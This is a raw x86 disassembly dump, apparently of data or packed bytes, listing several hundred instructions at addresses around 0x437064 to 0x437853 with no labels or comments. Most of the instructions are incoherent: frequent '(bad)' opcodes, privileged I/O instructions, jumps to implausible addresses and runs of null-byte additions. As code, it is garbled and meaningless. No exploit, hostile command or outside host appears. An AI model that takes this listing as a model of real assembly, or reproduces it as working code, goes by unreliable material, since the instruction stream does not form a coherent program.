  437064:	mov    ds:0xed6d2a85,al
  437069:	and    ch,cl
  43706b:	jmp    0x43706e
  43706d:	add    BYTE PTR [edx+0x2f],ah
  437070:	dec    edi
  437071:	(bad)  
  437073:	ja     0x4370c4
  437075:	test   DWORD PTR [edx],esi
  437077:	mov    ecx,0x116808a6
  43707c:	add    bh,cl
  43707e:	jmp    0xf223bff9
  437083:	jne    0x4370d4
  437085:	test   DWORD PTR [edx-0x15e7594a],esi
  43708b:	mov    bh,0xd4
  43708d:	inc    eax
  43708e:	icebp  
  43708f:	push   0xfffffffe
  437091:	test   BYTE PTR [eax],al
  437093:	mov    esi,edi
  437095:	mov    esi,0x6f9d9440
  43709a:	inc    eax
  43709b:	add    BYTE PTR [eax],al
  43709d:	add    BYTE PTR [eax],al
  43709f:	add    BYTE PTR [ecx+ebx*2-0x4ef8ccac],bl
  4370a6:	out    dx,eax
  4370a7:	(bad)  
  4370a8:	mov    ecx,DWORD PTR [ecx-0x7e630007]
  4370ae:	ja     0x4370b8
  4370b0:	pushf  
  4370b1:	std    
  4370b2:	or     DWORD PTR [esi-0x7cfffd74],0x73
  4370b9:	xchg   esi,eax
  4370ba:	stc    
  4370bb:	push   cs
  4370bc:	fdivr  DWORD PTR [edx+0x0]
  4370bf:	add    BYTE PTR [ebx+eax*4-0xa],bl
  4370c3:	and    BYTE PTR [edi-0x5c],bl
  4370c6:	jl     0x437145
  4370c8:	rol    BYTE PTR [esi],1
  4370ca:	pop    es
  4370cb:	test   bh,al
  4370cd:	push   es
  4370ce:	add    BYTE PTR [eax],al
  4370d0:	push   ebx
  4370d1:	cmp    dl,bh
  4370d3:	(bad)  
  4370d4:	loope  0x437143
  4370d6:	or     esi,0x5f
  4370d9:	data16 cmp al,BYTE PTR [ebx+0x5580fe5a]
  4370e0:	fs add ebx,eax
  4370e3:	adc    DWORD PTR [edx-0x5a],0x6b
  4370e7:	ficom  WORD PTR [edi]
  4370e9:	iret   
  4370ea:	sbb    esi,DWORD PTR [eax+ecx*8+0x7a]
  4370ee:	inc    ebp
  4370ef:	or     BYTE PTR [ebx+0x41],bl
  4370f2:	sbb    BYTE PTR [edi],ch
  4370f4:	jmp    0xf98d:0xbc70041
  4370fb:	(bad)  
  4370fc:	fdivr  QWORD PTR [edx-0x1]
  4370ff:	and    ah,0x8f
  437102:	or     BYTE PTR [esi+0x0],al
  437108:	add    BYTE PTR [edi+ebx*2+0x7014fff7],ch
  43710f:	idiv   edi
  437111:	mov    bl,0xcf
  437113:	push   edx
  437114:	pop    edi
  437115:	jne    0x437137
  437117:	mov    ds:0xfda3b75b,al
  43711c:	test   BYTE PTR [eax],dh
  43711e:	xchg   ebx,eax
  43711f:	mov    BYTE PTR [ebx-0x63],cl
  437122:	adc    al,BYTE PTR [ebp+0xc]
  437125:	(bad)  
  437126:	out    0x93,al
  437128:	xchg   DWORD PTR [ebp-0x1303cde0],eax
  43712e:	shl    ebx,cl
  437130:	xchg   BYTE PTR ds:0x497186a7,ah
  437136:	aad    0x84
  437138:	pop    ecx
  437139:	cmp    eax,0x7afe5bd0
  43713e:	fwait
  43713f:	std    
  437140:	pop    eax
  437141:	inc    BYTE PTR [ebp-0x648241c6]
  437147:	rcl    ah,1
  437149:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43714a:	adc    eax,0x9b7901c4
  43714f:	std    
  437150:	(bad)  
  437151:	cmp    ah,BYTE PTR [esi-0x4b]
  437154:	dec    DWORD PTR [edx-0x65]
  437157:	std    
  437158:	in     al,0x7a
  43715a:	in     al,0x41
  43715c:	fdivr  DWORD PTR [eax]
  43715e:	inc    esp
  43715f:	pushf  
  437160:	stc    
  437161:	(bad)  
  437162:	gs add eax,0x8643b885
  437168:	dec    eax
  437169:	jno    0x43718b
  43716b:	dec    edx
  43716c:	lock add BYTE PTR [eax],al
  43716f:	add    BYTE PTR [eax],al
  437171:	add    ah,ch
  437173:	mov    cl,BYTE PTR [eax+0x45121153]
  437179:	adc    ah,bh
  43717b:	dec    edx
  43717c:	add    DWORD PTR [ebp-0x7e],edi
  43717f:	ret    
  437180:	std    
  437181:	xchg   BYTE PTR [edx-0x4e8e793d],bl
  437187:	push   ss
  437188:	test   DWORD PTR [eax+edi*1-0x7ab82805],0x7284d217
  437193:	add    ah,BYTE PTR [esi-0x64]
  437196:	outs   dx,BYTE PTR ds:[esi]
  437197:	wbinvd 
  437199:	xchg   ebp,ecx
  43719b:	out    0x52,eax
  43719d:	add    al,BYTE PTR [eax+0xf]
  4371a0:	(bad)  
  4371a2:	inc    esi
  4371a3:	loope  0x437212
  4371a5:	inc    ecx
  4371a6:	xchg   ebp,eax
  4371a7:	js     0x4371c5
  4371a9:	or     al,0x9d
  4371ab:	inc    dl
  4371ad:	fwait
  4371ae:	pushf  
  4371af:	xchg   BYTE PTR [edi-0x153a7ef0],ah
  4371b5:	stc    
  4371b6:	xchg   edx,eax
  4371b7:	mov    edi,fs
  4371b9:	cmp    DWORD PTR [eax],esp
  4371bb:	dec    edx
  4371bc:	xchg   ebx,eax
  4371bd:	fwait
  4371be:	jl     0x43714c
  4371c0:	sub    cl,BYTE PTR [edi+0xca52e96]
  4371c6:	jne    0x43723f
  4371c8:	hlt    
  4371c9:	or     esi,eax
  4371cb:	inc    ebp
  4371cc:	xchg   edi,eax
  4371cd:	out    dx,eax
  4371ce:	mov    ah,0x6
  4371d0:	pop    esi
  4371d1:	cmp    DWORD PTR [ebp-0x28],edx
  4371d4:	shl    bl,0x0
  4371d7:	add    BYTE PTR [eax],al
  4371d9:	add    BYTE PTR [eax],al
  4371db:	push   ebx
  4371dc:	inc    esi
  4371dd:	out    dx,eax
  4371de:	add    al,0xaf
  4371e0:	mul    bh
  4371e2:	cmp    ah,BYTE PTR [ecx+0x7f]
  4371e5:	retf   0x750b
  4371e8:	jns    0x437196
  4371ea:	mov    bl,0xa9
  4371ec:	shl    DWORD PTR [ebx-0x41],1
  4371ef:	mov    eax,ds:0x851b65dd
  4371f4:	add    dl,BYTE PTR [esi-0x468895f1]
  4371fa:	pop    es
  4371fb:	clc    
  4371fc:	inc    ebx
  4371fd:	(bad)  
  4371fe:	out    dx,al
  4371ff:	cmp    DWORD PTR [ecx],esi
  437201:	mov    bh,0xab
  437203:	pop    ebx
  437204:	add    eax,0xfc1003e7
  437209:	ins    DWORD PTR es:[edi],dx
  43720a:	dec    edx
  43720b:	xor    DWORD PTR [edi-0x6e],0xb791fb
  437212:	cwde   
  437213:	test   al,0x9a
  437215:	pop    es
  437216:	int3   
  437217:	jbe    0x43721b
  437219:	xchg   DWORD PTR [esi],ebp
  43721b:	rol    DWORD PTR [edx+eax*2+0x7d01fa19],1
  437222:	ror    ebx,1
  437224:	(bad)  
  437226:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437227:	xor    eax,0x76e8fffa
  43722c:	add    bh,BYTE PTR [ebp-0x3f]
  43722f:	jl     0x437240
  437231:	add    DWORD PTR [esi-0x180005cb],ebp
  437237:	jbe    0x43723b
  437239:	test   DWORD PTR [esi],esi
  43723b:	jne    0x4371ce
  43723d:	xlat   BYTE PTR ds:[ebx]
  43723e:	add    al,BYTE PTR [eax]
  437240:	add    BYTE PTR [eax],al
  437242:	add    BYTE PTR [eax],al
  437244:	mov    eax,0xd96acddd
  437249:	inc    edx
  43724a:	jge    0x4371dd
  43724c:	imul   edi,ecx,0xffffff92
  43724f:	stos   DWORD PTR es:[edi],eax
  437250:	jnp    0x437289
  437252:	or     BYTE PTR [ebx],dh
  437254:	lock stos DWORD PTR es:[edi],eax
  437256:	sub    cl,0x76
  437259:	add    bh,ch
  43725b:	xchg   edi,eax
  43725c:	jae    0x43728f
  43725e:	cmp    al,0x6a
  437260:	ins    DWORD PTR es:[edi],dx
  437261:	mov    dl,0x0
  437263:	jo     0x4371e9
  437265:	fidiv  WORD PTR [edx-0x13]
  437268:	cmc    
  437269:	mov    ah,0x74
  43726b:	out    0xf3,eax
  43726d:	push   es
  43726e:	or     al,0xed
  437270:	test   ebx,esi
  437272:	test   BYTE PTR [esi+ebp*8-0xa193f82],ah
  437279:	pusha  
  43727a:	cli    
  43727b:	jmp    DWORD PTR cs:[edi]
  43727e:	push   ebp
  43727f:	popa   
  437280:	repz mov cl,bh
  437283:	push   ds
  437284:	dec    edi
  437285:	test   ebx,esp
  437287:	mov    ah,0x38
  437289:	cli    
  43728a:	jmp    DWORD PTR [ecx-0x4b]
  43728d:	stos   BYTE PTR es:[edi],al
  43728e:	pop    edx
  43728f:	add    BYTE PTR [edi],dl
  437291:	enter  0xe582,0x9
  437295:	lds    ecx,FWORD PTR [eax]
  437297:	add    BYTE PTR [ecx+ebp*2-0x37340009],ah
  43729e:	and    ch,0x39
  4372a1:	les    ecx,FWORD PTR [eax]
  4372a3:	add    bl,ch
  4372a5:	xchg   esi,eax
  4372a6:	cmp    al,0x0
  4372a8:	add    BYTE PTR [eax],al
  4372aa:	add    BYTE PTR [eax],al
  4372ac:	add    BYTE PTR [edx+0x18003c9b],ch
  4372b2:	popf   
  4372b3:	cmp    al,0x0
  4372b5:	pushf  
  4372b6:	mov    ds:0x9a61003c,al
  4372bb:	cmp    al,0x0
  4372bd:	fistp  WORD PTR [ecx-0x5d0fffc4]
  4372c3:	cmp    al,0x0
  4372c5:	dec    edi
  4372c6:	cwde   
  4372c7:	cmp    al,0x0
  4372c9:	call   0xd43af65
  4372ce:	cdq    
  4372cf:	cmp    al,0x0
  4372d1:	retf   0x3c98
  4372d4:	add    BYTE PTR [ecx-0x4a],ah
  4372d7:	cmp    al,0x0
  4372d9:	push   ebp
  4372da:	mov    dh,0x3c
  4372dc:	add    BYTE PTR [edi+ebp*4],al
  4372df:	cmp    al,0x0
  4372e1:	and    DWORD PTR [ebp-0x4a68ffc4],esi
  4372e7:	cmp    al,0x0
  4372e9:	ret    
  4372ea:	mov    ch,0x3c
  4372ec:	add    BYTE PTR [edi],bh
  4372ee:	mov    al,0x3c
  4372f0:	add    BYTE PTR [ebp-0xdffc350],ch
  4372f6:	mov    eax,0xb8e8003c
  4372fb:	cmp    al,0x0
  4372fd:	call   0x3cb3:0xb7003cb3
  437304:	add    dl,ah
  437306:	lods   al,BYTE PTR ds:[esi]
  437307:	cmp    al,0x0
  437309:	(bad)  
  43730a:	lods   eax,DWORD PTR ds:[esi]
  43730b:	cmp    al,0x0
  43730d:	jne    0x437361
  43730f:	fstp   TBYTE PTR [eax+eax*1]
  437312:	add    BYTE PTR [eax],al
  437314:	add    BYTE PTR [eax],al
  437316:	jne    0x43738e
  437318:	fstp   TBYTE PTR [esi*2+0x753cdcbe]
  43731f:	in     al,0xda
  437321:	cmp    al,0x75
  437323:	neg    edx
  437325:	cmp    al,0x75
  437327:	push   esi
  437328:	sar    DWORD PTR [esi*2+0x753cd41e],1
  43732f:	sbb    ebp,ecx
  437331:	cmp    al,0x75
  437333:	jg     0x437302
  437335:	cmp    al,0x75
  437337:	jbe    0x437306
  437339:	cmp    al,0x75
  43733b:	dec    edi
  43733c:	ror    esp,0xb9
  43733f:	push   edi
  437340:	ror    esp,0xb1
  437343:	out    0x8a,al
  437345:	in     al,dx
  437346:	inc    ebx
  437347:	and    al,0xa
  437349:	or     al,bh
  43734b:	imul   ecx,DWORD PTR [ecx],0xf7e1fe3b
  437351:	xor    BYTE PTR [ebp+0x2b84cde7],0xbf
  437358:	jp     0x437321
  43735a:	jmp    0xa184000f
  43735f:	push   ds
  437360:	mov    ebp,0x8aeb6f74
  437365:	inc    edx
  437366:	(bad)  
  437367:	jmp    0x4372ff
  437369:	iret   
  43736a:	not    dh
  43736c:	add    al,0x85
  43736e:	mov    ebx,0x8d528c87
  437373:	and    al,0x3f
  437375:	and    al,0xa4
  437377:	dec    ebp
  437378:	cwde   
  437379:	rol    BYTE PTR [eax],1
  43737b:	add    BYTE PTR [eax],al
  43737d:	add    BYTE PTR [eax],al
  43737f:	not    dh
  437381:	add    al,0xc1
  437383:	mov    bl,0xa7
  437385:	std    
  437386:	push   DWORD PTR [ebp-0x65]
  437389:	aam    0xbf
  43738b:	mov    ebx,0x7504c376
  437390:	add    bl,BYTE PTR [edi-0x67]
  437393:	or     al,0x89
  437395:	sbb    bh,BYTE PTR [ecx]
  437397:	sahf   
  437398:	(bad)  
  437399:	jmp    0x43739e
  43739b:	sub    DWORD PTR [esi-0x4a3e38e5],esi
  4373a1:	xor    eax,edi
  4373a3:	mov    ecx,0xb1c72bb5
  4373a8:	mov    ch,0x9c
  4373aa:	mov    ecx,cs
  4373ac:	jl     0x437352
  4373ae:	or     edi,eax
  4373b0:	stc    
  4373b1:	imul   ecx,ebp,0x41
  4373b4:	cmc    
  4373b5:	ins    DWORD PTR es:[edi],dx
  4373b6:	xor    DWORD PTR [ebp+0x7d],esp
  4373b9:	daa    
  4373ba:	clc    
  4373bb:	sub    BYTE PTR [ebp+0x34],bh
  4373be:	or     BYTE PTR [ebx+0x32],al
  4373c1:	ret    0x28b5
  4373c4:	mov    esi,0x7ce038eb
  4373c9:	and    al,0xf4
  4373cb:	icebp  
  4373cc:	(bad)  cs:[eax+edi*8]
  4373d0:	cmp    DWORD PTR [ebx],eax
  4373d2:	xor    dh,al
  4373d4:	xor    edi,eax
  4373d6:	xor    al,0x7c
  4373d8:	mov    bl,0x66
  4373da:	shr    BYTE PTR [ecx+0x27],0xa6
  4373de:	enter  0xb741,0xb3
  4373e2:	enter  0x0,0x0
  4373e6:	add    BYTE PTR [eax],al
  4373e8:	cmp    DWORD PTR [edi-0x48ce3755],esi
  4373ee:	sbb    al,0x8b
  4373f0:	dec    ecx
  4373f1:	jl     0x43740f
  4373f3:	or     al,0xf8
  4373f5:	inc    ecx
  4373f6:	test   DWORD PTR [eax-0x7501f0cb],0x4d5deaa6
  437400:	pop    ecx
  437401:	xor    al,0x5e
  437403:	xor    DWORD PTR [ecx-0x7ace91cc],ecx
  437409:	xor    al,0x6e
  43740b:	xor    DWORD PTR [ecx+0x34],esi
  43740e:	add    BYTE PTR [eax+0x257db303],bl
  437414:	add    eax,0xb472bd2d
  437419:	repnz sub al,0x3b
  43741c:	push   ds
  43741d:	dec    eax
  43741e:	jae    0x43740c
  437420:	pop    ds
  437421:	xor    eax,0x5759514
  437426:	enter  0xac06,0x45
  43742a:	test   DWORD PTR [esi+ebx*8-0x1d677acb],edx
  437431:	aaa    
  437432:	test   DWORD PTR [edx+edi*2-0x26d77ace],esp
  437439:	xor    eax,0xbef7b9f9
  43743e:	adc    BYTE PTR [esi+esi*4],dh
  437441:	mov    dh,0xcc
  437443:	popf   
  437444:	mov    edx,0xb2b5ccb6
  437449:	mov    dh,0xcc
  43744b:	lods   eax,DWORD PTR ds:[esi]
  43744c:	add    BYTE PTR [eax],al
  43744e:	add    BYTE PTR [eax],al
  437450:	add    BYTE PTR [edx-0x11e3334a],bh
  437456:	xchg   esi,eax
  437457:	test   DWORD PTR [ecx+eax*4],esp
  43745a:	add    eax,0x7d76f978
  43745f:	dec    ebx
  437460:	in     eax,dx
  437461:	out    dx,eax
  437462:	xor    bl,BYTE PTR [eax+edi*1]
  437465:	inc    edi
  437466:	push   cs
  437467:	push   es
  437468:	bound  esi,QWORD PTR [esi-0x866070a]
  43746e:	mov    ebp,0x7d361c08
  437473:	inc    eax
  437474:	int    0x3
  437476:	mov    dl,0x7d
  437478:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437479:	jle    0x437480
  43747b:	clc    
  43747c:	add    WORD PTR gs:0xf9bff729,ax
  437484:	mov    ah,0x37
  437486:	aad    0xcd
  437488:	lods   al,BYTE PTR ds:[esi]
  437489:	aaa    
  43748a:	mov    dh,0xcc
  43748c:	add    BYTE PTR [eax-0x41],ah
  43748f:	int3   
  437490:	int3   
  437491:	push   eax
  437492:	mov    edi,0x7bfacccc
  437497:	jmp    0x3974:0xee826cf7
  43749e:	jp     0x437444
  4374a0:	and    al,0xc
  4374a2:	add    eax,DWORD PTR [eax]
  4374a4:	add    BYTE PTR [edx-0x42],bl
  4374a7:	sti    
  4374a8:	jae    0x43748f
  4374aa:	jmp    FWORD PTR [ebp+0x79532f11]
  4374b0:	loop   0x437495
  4374b2:	add    eax,DWORD PTR [eax]
  4374b4:	add    BYTE PTR [eax],al
  4374b6:	add    BYTE PTR [eax],al
  4374b8:	add    BYTE PTR [eax],al
  4374ba:	lea    ebx,[ebx+0x8]
  4374bd:	xor    ebx,eax
  4374bf:	adc    DWORD PTR [eax+0x38fe9c22],ebp
  4374c5:	dec    esi
  4374c6:	sub    DWORD PTR [ebx+ecx*2+0x57],esp
  4374ca:	dec    edi
  4374cb:	jo     0x4374ed
  4374cd:	nop    ecx
  4374d0:	stc    
  4374d1:	call   FWORD PTR [ecx+edi*2-0x794c3e0a]
  4374d8:	test   bh,bh
  4374da:	lahf   
  4374db:	add    eax,DWORD PTR [ebx+0x105bddd0]
  4374e1:	mov    esi,DWORD PTR [edx+eax*8+0x610d08e3]
  4374e8:	test   DWORD PTR [eax],0xe279028c
  4374ee:	add    edi,edi
  4374f0:	(bad)  
  4374f1:	jmp    edi
  4374f3:	xchg   edx,eax
  4374f4:	mov    gs,WORD PTR [eax+0x3300423a]
  4374fa:	cmp    BYTE PTR ds:0xfe9c2aa8,cl
  437500:	sbb    al,0x9d
  437503:	pop    ebx
  437504:	sbb    BYTE PTR [ebx],dh
  437506:	dec    eax
  437507:	or     eax,0x5b7522a8
  43750c:	std    
  43750d:	and    dh,BYTE PTR [edx]
  43750f:	pushf  
  437510:	std    
  437511:	jmp    DWORD PTR [esi-0x59]
  437514:	jp     0x4374be
  437516:	push   ebx
  437517:	pop    ebx
  437518:	std    
  437519:	sub    al,0xc4
  43751b:	xchg   edi,eax
  43751c:	mov    BYTE PTR [esi+0x0],bh
  437522:	add    BYTE PTR [esp+eax*2],dh
  437525:	hlt    
  437526:	and    cl,BYTE PTR [edx]
  437528:	pushf  
  437529:	std    
  43752a:	(bad)  
  43752b:	out    dx,al
  43752c:	lahf   
  43752d:	jp     0x4374d7
  43752f:	push   ebx
  437530:	pop    ebx
  437531:	std    
  437532:	test   bh,cl
  437534:	fisub  DWORD PTR [esi-0x6d070bf8]
  43753a:	add    BYTE PTR [ebp-0x65],dh
  43753d:	rol    BYTE PTR [ebx],1
  43753f:	clc    
  437540:	inc    ebx
  437541:	out    0x3f,al
  437543:	jne    0x437565
  437545:	mov    dh,0xbf
  437547:	fiadd  WORD PTR [ebx]
  437549:	iret   
  43754a:	add    esp,eax
  43754c:	jae    0x43752d
  43754e:	aas    
  43754f:	jne    0x43756b
  437551:	lahf   
  437552:	stc    
  437553:	jne    0x4374f0
  437555:	std    
  437556:	sub    al,0x71
  437558:	es sub dh,BYTE PTR gs:0x6d3ed09b
  437560:	and    BYTE PTR [ebp-0x77546041],ch
  437566:	fdiv   DWORD PTR [eax+esi*2+0x64967f05]
  43756d:	std    
  43756e:	push   DWORD PTR [ebp+0x1a]
  437571:	lahf   
  437572:	stc    
  437573:	jne    0x437510
  437575:	std    
  437576:	test   BYTE PTR [ecx-0x4add9ada],al
  43757c:	fwait
  43757d:	rcl    BYTE PTR [ebx],1
  43757f:	clc    
  437580:	inc    edx
  437581:	out    0x3f,eax
  437583:	jne    0x4375a5
  437585:	mov    ch,0xbf
  437587:	add    BYTE PTR [eax],al
  437589:	add    BYTE PTR [eax],al
  43758b:	add    BYTE PTR [esi+0x2],bl
  43758e:	call   eax
  437590:	data16 addr16 (bad) 
  437593:	loope  0x43760f
  437595:	add    cl,BYTE PTR [edx*4-0x2f18fd8b]
  43759c:	xchg   BYTE PTR [edi-0x71],bh
  43759f:	in     eax,0x62
  4375a1:	add    dh,dh
  4375a3:	xor    ch,BYTE PTR [ecx+0x79]
  4375a6:	and    eax,0x3f21dc2
  4375ab:	xchg   ebp,eax
  4375ac:	jne    0x4375b0
  4375ae:	out    0x88,eax
  4375b0:	jns    0x437631
  4375b2:	dec    edi
  4375b3:	fnstsw WORD PTR [edx]
  4375b5:	add    bl,BYTE PTR [esi-0x47]
  4375b8:	xor    bl,BYTE PTR [ecx-0x7b377d21]
  4375be:	out    0x3,eax
  4375c0:	jne    0x437593
  4375c2:	loop   0x43763a
  4375c4:	or     eax,0xf803a6d8
  4375c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4375ca:	sub    BYTE PTR [eax+0x70ead16d],ch
  4375d0:	or     eax,0x3a0426e0
  4375d5:	mov    al,ds:0x27504d2
  4375da:	push   ss
  4375db:	or     BYTE PTR [esi],al
  4375dd:	pop    edx
  4375de:	adc    DWORD PTR [ebp+esi*2-0x2f],eax
  4375e2:	daa    
  4375e3:	hlt    
  4375e4:	icebp  
  4375e5:	mov    cl,0xa8
  4375e7:	sahf   
  4375e8:	gs jns 0x43757a
  4375eb:	lds    edx,FWORD PTR [eax+0xa667f9]
  4375f1:	add    BYTE PTR [eax],al
  4375f3:	add    BYTE PTR [eax],al
  4375f5:	jl     0x4375f8
  4375f7:	out    0x3,eax
  4375f9:	lock in eax,dx
  4375fb:	jnp    0x437659
  4375fd:	xchg   edi,eax
  4375fe:	inc    edx
  4375ff:	out    0x84,eax
  437601:	dec    eax
  437602:	test   bh,ah
  437604:	add    esi,DWORD PTR [ebp-0x31]
  437607:	shl    BYTE PTR [eax+0xd],cl
  43760a:	fcos   
  43760c:	sub    BYTE PTR [ecx+0x7d],bh
  43760f:	fsubr  DWORD PTR [eax-0x2d31516]
  437615:	lds    ebx,FWORD PTR [edx+0x1e]
  437618:	test   eax,0xe9f8df76
  43761d:	jbe    0x437621
  43761f:	sub    eax,0x2a5afdf5
  437624:	test   eax,0xd54ed576
  437629:	fwait
  43762a:	inc    esp
  43762b:	mov    edi,0xf8e10941
  437630:	jmp    0xedc878ab
  437635:	in     eax,dx
  437636:	pop    edx
  437637:	and    ch,BYTE PTR [ecx+0x28d67d76]
  43763d:	adc    bh,bl
  43763f:	jle    0x43764b
  437641:	push   es
  437642:	add    eax,DWORD PTR [eax]
  437644:	jmp    0x51de7614
  437649:	mov    ebx,0x2361ffc3
  43764e:	inc    esp
  43764f:	in     eax,0xd1
  437651:	mov    ds:0xd8919aff,eax
  437656:	ret    
  437657:	jmp    DWORD PTR [edi+0x0]
  43765a:	add    BYTE PTR [eax],al
  43765c:	add    BYTE PTR [eax],al
  43765e:	adc    BYTE PTR [edx-0x2a891700],cl
  437664:	add    esi,DWORD PTR [esi+ecx*2-0x28]
  437668:	aas    
  437669:	jmp    0xfa63ba69
  43766e:	xor    DWORD PTR [edx+0x7e96c77d],ecx
  437674:	shl    BYTE PTR [edx-0x22],1
  437677:	inc    ebx
  437678:	out    0xf9,al
  43767a:	mov    ecx,0xd068089d
  43767f:	mov    DWORD PTR [eax],eax
  437681:	jmp    0x7457f3fc
  437686:	into   
  437687:	loopne 0x4376c8
  437689:	add    BYTE PTR [esi+edi*2-0x25],cl
  43768d:	dec    DWORD PTR [edi+edi*8-0x1]
  437691:	xor    dh,BYTE PTR [eax]
  437693:	adc    ch,BYTE PTR [eax-0x7d0163d6]
  437699:	fmul   DWORD PTR [ebp+0x40331864]
  43769f:	adc    ch,BYTE PTR [eax+0x1cfedc22]
  4376a5:	call   FWORD PTR [edi+edi*8]
  4376a8:	push   DWORD PTR [edx]
  4376aa:	inc    eax
  4376ab:	jp     0x437655
  4376ad:	cs int3 
  4376af:	(bad)  
  4376b0:	sub    dl,BYTE PTR [ecx+0x48]
  4376b3:	add    al,0xba
  4376b5:	shl    DWORD PTR [edi+ecx*4-0xf300e2],0xff
  4376bd:	mov    dl,BYTE PTR [eax]
  4376bf:	jp     0x437669
  4376c1:	add    BYTE PTR es:[eax],al
  4376c4:	add    BYTE PTR [eax],al
  4376c6:	add    BYTE PTR [edi+edi*8],bl
  4376c9:	sbb    dl,0x9d
  4376cc:	or     BYTE PTR fs:[ecx+0x706f],al
  4376d3:	int3   
  4376d4:	stos   DWORD PTR es:[edi],eax
  4376d5:	std    
  4376d6:	pushf  
  4376d7:	xor    al,0xa5
  4376d9:	cmp    DWORD PTR [eax],eax
  4376db:	push   edi
  4376dc:	push   ebp
  4376dd:	mov    ecx,0xfdad74eb
  4376e2:	pushf  
  4376e3:	in     al,0x9b
  4376e5:	cmp    DWORD PTR [eax],eax
  4376e7:	sbb    eax,0x9c00f75c
  4376ec:	(bad)  
  4376ed:	sub    al,BYTE PTR [ecx+eax*2]
  4376f0:	es es inc eax
  4376f3:	mov    WORD PTR [ecx+0x7],es
  4376f6:	test   eax,ecx
  4376f8:	jb     0x4376f1
  4376fa:	call   FWORD PTR [edi]
  4376fc:	jo     0x437702
  4376fe:	jb     0x43773c
  437700:	add    eax,0xfbe6c1ce
  437705:	cmp    bh,0x75
  437708:	pop    esp
  437709:	(bad)  
  43770a:	jl     0x437740
  43770c:	push   0x9934f87c
  437711:	hlt    
  437712:	jle    0x437766
  437714:	add    DWORD PTR [eax+eax*1],eax
  437717:	jne    0x4376fd
  437719:	iret   
  43771a:	mov    edx,0x3d4a1d
  43771f:	out    dx,al
  437720:	ret    
  437721:	mov    esp,0xa2ea6de5
  437726:	stc    
  437727:	jne    0x437794
  437729:	std    
  43772a:	sub    al,0x0
  43772c:	add    BYTE PTR [eax],al
  43772e:	add    BYTE PTR [eax],al
  437730:	imul   ebp,esi,0x6bb5265b
  437736:	jl     0x437710
  437738:	xor    al,0xd5
  43773a:	jmp    0x437768
  43773c:	push   ecx
  43773d:	(bad)  
  43773e:	pop    ebx
  43773f:	push   ds
  437740:	mov    ch,0x6b
  437742:	loop   0x43773c
  437744:	jne    0x4377b1
  437746:	std    
  437747:	sub    al,0x39
  437749:	out    0x5b,al
  43774b:	sub    dh,BYTE PTR ds:0x71ea846b
  437751:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437752:	jl     0x437715
  437754:	push   0xf0552f40
  437759:	jns    0x43776c
  43775b:	push   ss
  43775c:	in     eax,0x68
  43775e:	push   edi
  43775f:	jbe    0xc321f480
  437765:	imul   edi,ebp,0xffffffff
  437768:	mov    ah,0x53
  43776a:	cmc    
  43776b:	sub    al,0x79
  43776d:	(bad)  
  43776e:	push   esp
  43776f:	push   ds
  437770:	xor    eax,0x284a3e6b
  437775:	push   eax
  437776:	cwde   
  437777:	sar    BYTE PTR [ebx],1
  437779:	lods   al,BYTE PTR ds:[esi]
  43777a:	mov    ecx,0x7b1ec1cc
  43777f:	in     al,dx
  437780:	(bad)  
  437781:	push   ds
  437782:	add    BYTE PTR [ebx+0xa1c02ac],al
  437788:	dec    eax
  437789:	inc    edx
  43778a:	cmp    al,0xc6
  43778c:	add    DWORD PTR [edx],0x8d85365e
  437792:	and    al,0xfc
  437794:	add    BYTE PTR [eax],al
  437796:	add    BYTE PTR [eax],al
  437798:	add    BYTE PTR [edx+0x27],bl
  43779b:	test   BYTE PTR [eax-0x5b20a4],dl
  4377a1:	push   edx
  4377a2:	dec    ebp
  4377a3:	fs test ecx,esp
  4377a6:	add    edi,esp
  4377a8:	add    ecx,DWORD PTR [edx]
  4377aa:	and    al,ch
  4377ac:	add    esi,DWORD PTR [ebp-0x28]
  4377af:	imul   esp,DWORD PTR [edi],0x59
  4377b2:	add    dl,BYTE PTR [esi]
  4377b4:	call   0x635:0x85178b97
  4377bb:	mov    al,0x16
  4377bd:	es (bad) 
  4377bf:	gs jnp 0x43783c
  4377c2:	add    ah,bh
  4377c4:	dec    edx
  4377c5:	outs   dx,DWORD PTR ds:[esi]
  4377c6:	add    ah,bh
  4377c8:	add    edx,DWORD PTR [eax+0x78]
  4377cb:	mov    DWORD PTR [edx+0x45],edi
  4377ce:	test   DWORD PTR [edi],esp
  4377d0:	pop    es
  4377d1:	cmp    dh,bh
  4377d3:	sbb    edi,DWORD PTR [esi+0x6b]
  4377d6:	(bad)  
  4377d7:	fadd   QWORD PTR [ebx]
  4377d9:	jne    0x437796
  4377db:	(bad)  
  4377dc:	add    esi,DWORD PTR [ebp+0x2]
  4377df:	ins    BYTE PTR es:[edi],dx
  4377e0:	daa    
  4377e1:	cdq    
  4377e2:	add    dh,BYTE PTR [esi-0x4874a867]
  4377e8:	test   BYTE PTR [ebp-0x39e6cffb],dh
  4377ee:	mov    ecx,0x27503e8
  4377f3:	dec    ecx
  4377f4:	jge    0x437821
  4377f6:	xchg   esi,eax
  4377f7:	jecxz  0x4377fc
  4377f9:	jne    0x437830
  4377fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4377fc:	jge    0x4377fe
  4377fe:	add    BYTE PTR [eax],al
  437800:	add    BYTE PTR [eax],al
  437802:	sbb    ebp,DWORD PTR [esi-0x748afc2f]
  437808:	add    BYTE PTR [ebx+0x29],ch
  43780b:	adc    al,0x0
  43780d:	jmp    0xfff37813
  437812:	jbe    0x437816
  437814:	xchg   DWORD PTR [ebx-0x27],ebp
  437817:	adc    al,0x0
  437819:	jmp    0x9e1035b6
  43781e:	xor    eax,0x35b5cc4f
  437823:	dec    edi
  437824:	int3   
  437825:	lods   eax,DWORD PTR ds:[esi]
  437826:	xor    eax,0xce1ccc4f
  43782b:	outs   dx,BYTE PTR ds:[esi]
  43782c:	dec    edi
  43782d:	(bad)  
  43782e:	leave  
  43782f:	rcl    BYTE PTR [ebx],cl
  437831:	jmp    0x729545ac
  437836:	mov    WORD PTR [edx],cs
  437838:	test   DWORD PTR [ebp-0x3f],esi
  43783b:	fiadd  WORD PTR [ecx+ebp*8]
  43783e:	jbe    0x4377cb
  437840:	or     al,0xff
  437842:	cdq    
  437843:	(bad)  
  437845:	add    cl,bh
  437847:	or     DWORD PTR [ecx+0x27188],ecx
  43784d:	lods   al,BYTE PTR ds:[esi]
  43784e:	sbb    eax,0x5171b487
  437853:	add    eax,0x9e6fe900
